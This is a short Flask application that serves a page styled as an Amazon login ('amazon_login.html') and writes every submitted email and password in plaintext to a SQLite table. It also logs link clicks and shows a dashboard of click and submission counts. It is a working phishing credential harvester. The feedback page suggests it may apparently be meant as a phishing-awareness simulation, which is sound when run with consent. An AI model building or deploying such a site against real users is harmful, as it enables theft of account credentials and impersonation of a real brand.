from flask import Flask, request, render_template, redirect
import sqlite3
from datetime import datetime

app = Flask(__name__)

# Initialize the database
def init_db():
    conn = sqlite3.connect('database.sqlite')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY, 
                    email TEXT, 
                    password TEXT, 
                    timestamp DATETIME)''')
    c.execute('''CREATE TABLE IF NOT EXISTS clicks (
                    id INTEGER PRIMARY KEY, 
                    timestamp DATETIME)''')
    conn.commit()
    conn.close()

@app.route('/')
def amazon_login():
    return render_template('amazon_login.html')

@app.route('/submit_credentials', methods=['POST'])
def submit_credentials():
    email = request.form['email']
    password = request.form['password']
    timestamp = datetime.now()

    # Log credentials
    conn = sqlite3.connect('database.sqlite')
    c = conn.cursor()
    c.execute("INSERT INTO logs (email, password, timestamp) VALUES (?, ?, ?)", 
              (email, password, timestamp))
    conn.commit()
    conn.close()
    return render_template('feedback.html')

@app.route('/track_click', methods=['GET'])
def track_click():
    timestamp = datetime.now()

    # Log click
    conn = sqlite3.connect('database.sqlite')
    c = conn.cursor()
    c.execute("INSERT INTO clicks (timestamp) VALUES (?)", (timestamp,))
    conn.commit()
    conn.close()
    return redirect('/')

@app.route('/dashboard', methods=['GET'])
def dashboard():
    conn = sqlite3.connect('database.sqlite')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM clicks")
    clicks = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM logs")
    submissions = c.fetchone()[0]
    conn.close()
    return render_template('dashboard.html', clicks=clicks, submissions=submissions)

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
